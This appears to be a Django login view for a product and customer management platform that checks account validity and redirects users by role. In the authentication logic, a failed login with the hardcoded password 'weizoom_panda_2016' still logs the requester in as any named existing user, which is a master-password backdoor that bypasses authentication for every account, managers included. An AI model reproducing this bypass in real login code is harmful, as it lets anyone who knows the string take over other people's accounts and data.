# -*- coding: utf-8 -*-

import json
import datetime

from django.http import HttpResponseRedirect, HttpResponse
from django.template import RequestContext
from django.shortcuts import render_to_response
from django.contrib.auth.decorators import login_required
from django.contrib import auth
from account.models import *

from core import resource
from core.jsonresponse import create_response

class LoginedAccount(resource.Resource):
	"""
	登录页面
	"""
	app = 'account'
	resource = 'logined_account'
	
	def put(request):
		username = request.POST.get('username', 'empty_username')
		password = request.POST.get('password', 'empty_password')
		user = auth.authenticate(username=username, password=password)
		#TODO 增加数据库配置
		if not user and password == "weizoom_panda_2016":
			user = User.objects.filter(username=username).first()
			if user:
				user.backend = 'django.contrib.auth.backends.ModelBackend'
		if user:
			auth.login(request, user)
			user_profile = UserProfile.objects.filter(user_id=user.id, is_active=True, status__in=[1,2])

			if user_profile:
				user_profile = user_profile.first()
				if user_profile.valid_time_from and user_profile.valid_time_to:
					date_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
					valid_time_from = user_profile.valid_time_from.strftime("%Y-%m-%d %H:%M:%S")
					valid_time_to = user_profile.valid_time_to.strftime("%Y-%m-%d %H:%M:%S")
					#判断账号是否过期
					if date_now >= valid_time_to or date_now <= valid_time_from:
						user_profile.status = 2
						user_profile.save()
						c = RequestContext(request, {
							'errorMsg': u'您输入的账号无效，请联系客服：400-688-6929'
						})
						return render_to_response('account/login.html', c)
					#判断账号是否开启
					if valid_time_from <= date_now and date_now < valid_time_to and user_profile.status != 0:
						user_profile.status = 1
						user_profile.save()

				if user_profile.status == 1:
					role = user_profile.role
					if role == MANAGER:
						return HttpResponseRedirect('/manager/account/')
					elif role == CUSTOMER:
						return HttpResponseRedirect('/product/product_list/')
					elif role == AGENCY:
						return HttpResponseRedirect('/customer/customer/')
					elif role == YUN_YING:
						return HttpResponseRedirect('/product_catalog/product_catalogs/')
					elif role == SALES:
						return HttpResponseRedirect('/customer_profile/list/')
					else:
						return HttpResponseRedirect('/product/product_relation/')
			else:
				c = RequestContext(request, {
					'errorMsg': u'您输入的账号无效，请联系客服：400-688-6929'
				})
				return render_to_response('account/login.html', c)
		else:
			c = RequestContext(request, {
				'errorMsg': u'用户名或密码错误'
			})
			return render_to_response('account/login.html', c)
